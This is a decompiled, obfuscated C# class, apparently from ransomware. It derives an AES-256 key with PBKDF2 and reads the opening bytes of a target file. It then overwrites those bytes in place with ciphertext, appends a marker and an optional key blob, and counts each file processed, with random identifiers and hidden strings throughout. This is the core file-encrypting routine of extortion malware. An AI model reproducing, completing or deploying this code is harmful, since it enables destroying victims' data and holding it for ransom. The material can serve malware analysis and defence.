using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wmzoZRdMaf;

public static class JCghqZmaNmX
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] mmAjtCaUmxxI(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = VgjeoGSwVrAs(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes VgjeoGSwVrAs(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] sRBPBEhfdE(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (IuKjJmfJcVBFA.GEhrwQCvgoMn == getString_0(107397041))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (IuKjJmfJcVBFA.JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(IuKjJmfJcVBFA.AIOBtLgIwjoLs, getString_0(107388145) + string_0 + getString_0(107403376) + ex.Message + getString_0(107396808));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool EAuQzPgdvEdb(string XrDEgIqvtimnb, byte[] YfXnuFcJvJQ, byte[] ihfgVyorCHJcqa = null)
	{
		try
		{
			byte[] array = null;
			if (IuKjJmfJcVBFA.GEhrwQCvgoMn == getString_0(107397041))
			{
				array = (IuKjJmfJcVBFA.intMyWSRTiS ? Encoding.ASCII.GetBytes(IuKjJmfJcVBFA.dOioDTBjWKE(IuKjJmfJcVBFA.jJTxLnMtOyZg) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403318)) + Convert.ToString(IuKjJmfJcVBFA.reMazhEZDt) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403318))) : Encoding.ASCII.GetBytes(IuKjJmfJcVBFA.dOioDTBjWKE(IuKjJmfJcVBFA.jJTxLnMtOyZg) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403295)) + Convert.ToString(IuKjJmfJcVBFA.reMazhEZDt) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403295))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(XrDEgIqvtimnb, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(YfXnuFcJvJQ, 0, YfXnuFcJvJQ.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(XrDEgIqvtimnb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!IuKjJmfJcVBFA.intMyWSRTiS)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(ihfgVyorCHJcqa, 0, ihfgVyorCHJcqa.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (IuKjJmfJcVBFA.intMyWSRTiS ? Encoding.ASCII.GetBytes(IuKjJmfJcVBFA.dOioDTBjWKE(IuKjJmfJcVBFA.jJTxLnMtOyZg) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403318)) + Convert.ToString(IuKjJmfJcVBFA.reMazhEZDt) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403318))) : Encoding.ASCII.GetBytes(IuKjJmfJcVBFA.dOioDTBjWKE(IuKjJmfJcVBFA.jJTxLnMtOyZg) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403295)) + Convert.ToString(IuKjJmfJcVBFA.reMazhEZDt) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403295))));
				FileStream fileStream2 = new FileStream(XrDEgIqvtimnb, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(YfXnuFcJvJQ, 0, YfXnuFcJvJQ.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(XrDEgIqvtimnb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!IuKjJmfJcVBFA.intMyWSRTiS)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(ihfgVyorCHJcqa, 0, ihfgVyorCHJcqa.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			IuKjJmfJcVBFA.vYQbqQWbSUgNb++;
		}
		catch (Exception ex)
		{
			if (IuKjJmfJcVBFA.JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(IuKjJmfJcVBFA.AIOBtLgIwjoLs, getString_0(107388145) + XrDEgIqvtimnb + getString_0(107403277) + ex.Message + getString_0(107396808));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (IuKjJmfJcVBFA.intMyWSRTiS ? Encoding.ASCII.GetBytes(IuKjJmfJcVBFA.dOioDTBjWKE(IuKjJmfJcVBFA.jJTxLnMtOyZg) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403318)) + Convert.ToString(IuKjJmfJcVBFA.reMazhEZDt) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403318))) : Encoding.ASCII.GetBytes(IuKjJmfJcVBFA.dOioDTBjWKE(IuKjJmfJcVBFA.jJTxLnMtOyZg) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403295)) + Convert.ToString(IuKjJmfJcVBFA.reMazhEZDt) + IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107403295))));
				FileStream fileStream4 = new FileStream(XrDEgIqvtimnb, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(YfXnuFcJvJQ, 0, YfXnuFcJvJQ.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(XrDEgIqvtimnb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!IuKjJmfJcVBFA.intMyWSRTiS)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(ihfgVyorCHJcqa, 0, ihfgVyorCHJcqa.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static JCghqZmaNmX()
	{
		Strings.CreateGetStringDelegate(typeof(JCghqZmaNmX));
	}
}
